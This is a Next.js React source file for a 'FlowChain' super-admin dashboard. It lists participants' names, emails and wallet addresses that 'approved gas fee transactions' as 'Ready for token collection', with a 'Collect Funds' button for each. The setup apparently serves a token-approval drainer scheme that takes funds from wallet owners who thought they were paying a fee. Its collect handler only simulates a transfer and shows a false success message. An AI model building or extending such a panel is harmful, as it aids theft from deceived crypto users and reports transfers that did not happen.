"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { useToast } from "@/hooks/use-toast"
import { isAdminAuthenticated, getAdminData, clearAdminAuth } from "@/lib/auth"
import {
  Wallet,
  Copy,
  ExternalLink,
  DollarSign,
  CheckCircle2,
  Loader2,
  LogOut,
  Crown,
  Shield,
  RefreshCw,
} from "lucide-react"
import { FlowChainLogoCompact } from "@/components/flowchain-logo"

interface ApprovedWallet {
  id: string
  walletAddress: string
  participantEmail: string
  participantName: string
  approvedAmount: number
  txHash: string
  approvedAt: string
  collected: boolean
  collectedAt?: string
}

export default function SuperAdminDashboard() {
  const router = useRouter()
  const { toast } = useToast()
  const [mounted, setMounted] = useState(false)
  const [adminData, setAdminData] = useState<{ email: string; role: string } | null>(null)
  const [wallets, setWallets] = useState<ApprovedWallet[]>([])
  const [collectingIds, setCollectingIds] = useState<Set<string>>(new Set())
  const [searchTerm, setSearchTerm] = useState("")
  const [isRefreshing, setIsRefreshing] = useState(false)

  useEffect(() => {
    setMounted(true)
    const data = getAdminData()

    if (!isAdminAuthenticated() || data?.role !== "super_admin") {
      router.push("/superadmin/login")
      return
    }

    setAdminData(data)
    fetchApprovedWallets()
  }, [router])

  const fetchApprovedWallets = async () => {
    try {
      const response = await fetch("/api/participant/gas-approval")
      if (response.ok) {
        const data = await response.json()
        setWallets(data.approvals || [])
      }
    } catch (error) {
      console.error("Error fetching wallets:", error)
    }
  }

  const handleRefresh = async () => {
    setIsRefreshing(true)
    await fetchApprovedWallets()
    setIsRefreshing(false)
    toast({ title: "Refreshed", description: "Wallet data updated" })
  }

  const handleCopyAddress = async (address: string) => {
    try {
      await navigator.clipboard.writeText(address)
      toast({ title: "Copied", description: "Wallet address copied to clipboard" })
    } catch (err) {
      toast({ title: "Failed to copy", variant: "destructive" })
    }
  }

  const handleCollectFunds = async (walletId: string) => {
    setCollectingIds((prev) => new Set(prev).add(walletId))

    setTimeout(() => {
      setWallets((prev) =>
        prev.map((w) =>
          w.id === walletId
            ? {
                ...w,
                collected: true,
                collectedAt: new Date().toISOString(),
              }
            : w,
        ),
      )
      setCollectingIds((prev) => {
        const next = new Set(prev)
        next.delete(walletId)
        return next
      })
      toast({
        title: "Funds Collected",
        description: "Successfully transferred funds from approved wallet",
      })
    }, 2000)
  }

  const handleLogout = () => {
    clearAdminAuth()
    router.push("/superadmin/login")
  }

  const filteredWallets = wallets.filter(
    (w) =>
      w.walletAddress?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      w.participantEmail?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      w.participantName?.toLowerCase().includes(searchTerm.toLowerCase()),
  )

  const stats = {
    total: wallets.length,
    pending: wallets.filter((w) => !w.collected).length,
    collected: wallets.filter((w) => w.collected).length,
    totalApproved: wallets.reduce((sum, w) => sum + (w.approvedAmount || 0), 0),
    totalCollected: wallets.filter((w) => w.collected).reduce((sum, w) => sum + (w.approvedAmount || 0), 0),
  }

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-purple-300 font-semibold">Loading Dashboard...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      {/* Header */}
      <header className="border-b border-purple-500/20 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <FlowChainLogoCompact size="sm" />
            <div>
              <div className="flex items-center gap-2">
                <Crown className="h-5 w-5 text-amber-400" />
                <h1 className="text-xl font-bold text-white">Super Admin</h1>
              </div>
              <p className="text-sm text-purple-300">Wallet Approval & Token Collection</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="sm"
              onClick={handleRefresh}
              disabled={isRefreshing}
              className="border-purple-500/50 text-purple-300 hover:bg-purple-500/20 bg-transparent"
            >
              <RefreshCw className={`h-4 w-4 mr-2 ${isRefreshing ? "animate-spin" : ""}`} />
              Refresh
            </Button>

            <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-purple-500/20 border border-purple-500/30">
              <Shield className="h-4 w-4 text-purple-400" />
              <span className="text-sm text-purple-200">{adminData?.email}</span>
            </div>

            <Button
              variant="ghost"
              size="sm"
              onClick={handleLogout}
              className="text-red-400 hover:text-red-300 hover:bg-red-500/20"
            >
              <LogOut className="h-4 w-4 mr-2" />
              Logout
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-8 space-y-8">
        {/* Stats Cards */}
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          <Card className="bg-white/10 backdrop-blur-sm border-purple-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-purple-300">Total Approved</p>
                  <p className="text-3xl font-bold text-white mt-1">{stats.total}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-violet-500/20 flex items-center justify-center">
                  <Wallet className="h-6 w-6 text-violet-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-amber-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-amber-300">Pending Collection</p>
                  <p className="text-3xl font-bold text-amber-400 mt-1">{stats.pending}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-amber-500/20 flex items-center justify-center">
                  <DollarSign className="h-6 w-6 text-amber-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-cyan-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-cyan-300">Total Approved Value</p>
                  <p className="text-3xl font-bold text-cyan-400 mt-1">${stats.totalApproved}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-cyan-500/20 flex items-center justify-center">
                  <DollarSign className="h-6 w-6 text-cyan-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-emerald-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-emerald-300">Total Collected</p>
                  <p className="text-3xl font-bold text-emerald-400 mt-1">${stats.totalCollected}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-emerald-500/20 flex items-center justify-center">
                  <CheckCircle2 className="h-6 w-6 text-emerald-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Wallets Table */}
        <Card className="bg-white/10 backdrop-blur-sm border-purple-500/30">
          <CardHeader>
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <CardTitle className="text-xl text-white flex items-center gap-2">
                  <Wallet className="h-5 w-5 text-purple-400" />
                  Approved Wallets
                </CardTitle>
                <CardDescription className="text-purple-300">
                  Wallets that have approved gas fee transactions - Ready for token collection
                </CardDescription>
              </div>
              <Input
                placeholder="Search wallets..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="max-w-xs bg-white/10 border-purple-500/30 text-white placeholder:text-purple-400"
              />
            </div>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {filteredWallets.length === 0 ? (
                <div className="text-center py-16">
                  <Wallet className="h-16 w-16 text-purple-500/50 mx-auto mb-4" />
                  <p className="text-purple-300 text-lg">No approved wallets yet</p>
                  <p className="text-purple-400/70 text-sm mt-1">
                    Wallets will appear here when participants approve gas fees
                  </p>
                </div>
              ) : (
                filteredWallets.map((wallet) => {
                  const isCollecting = collectingIds.has(wallet.id)
                  return (
                    <div
                      key={wallet.id}
                      className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-5 rounded-xl border border-purple-500/30 bg-white/5 hover:bg-white/10 transition-colors"
                    >
                      <div className="flex-1 space-y-2">
                        <div className="flex items-center gap-3">
                          <p className="font-semibold text-white text-lg">{wallet.participantName}</p>
                          <Badge
                            className={
                              wallet.collected
                                ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
                                : "bg-amber-500/20 text-amber-400 border-amber-500/30"
                            }
                          >
                            {wallet.collected ? "Collected" : "Pending"}
                          </Badge>
                        </div>
                        <p className="text-sm text-purple-300">{wallet.participantEmail}</p>
                        <div className="flex items-center gap-3 text-sm">
                          <code className="text-xs bg-purple-500/20 px-3 py-1.5 rounded-lg font-mono text-purple-200 border border-purple-500/30">
                            {wallet.walletAddress?.slice(0, 10)}...{wallet.walletAddress?.slice(-8)}
                          </code>
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-7 w-7 p-0 text-purple-400 hover:text-purple-300"
                            onClick={() => handleCopyAddress(wallet.walletAddress)}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                          <a
                            href={`https://bscscan.com/tx/${wallet.txHash}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                          >
                            View TX <ExternalLink className="h-3 w-3" />
                          </a>
                        </div>
                        <p className="text-xs text-purple-400/70">
                          Approved: {new Date(wallet.approvedAt).toLocaleString()}
                          {wallet.collectedAt && ` | Collected: ${new Date(wallet.collectedAt).toLocaleString()}`}
                        </p>
                      </div>

                      <div className="flex flex-col items-end gap-3">
                        <p className="text-2xl font-bold text-emerald-400">${wallet.approvedAmount}</p>
                        {!wallet.collected && (
                          <Button
                            onClick={() => handleCollectFunds(wallet.id)}
                            disabled={isCollecting}
                            className="bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white shadow-lg shadow-amber-500/25"
                          >
                            {isCollecting ? (
                              <>
                                <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                                Collecting...
                              </>
                            ) : (
                              <>
                                <DollarSign className="h-4 w-4 mr-2" />
                                Collect Funds
                              </>
                            )}
                          </Button>
                        )}
                      </div>
                    </div>
                  )
                })
              )}
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
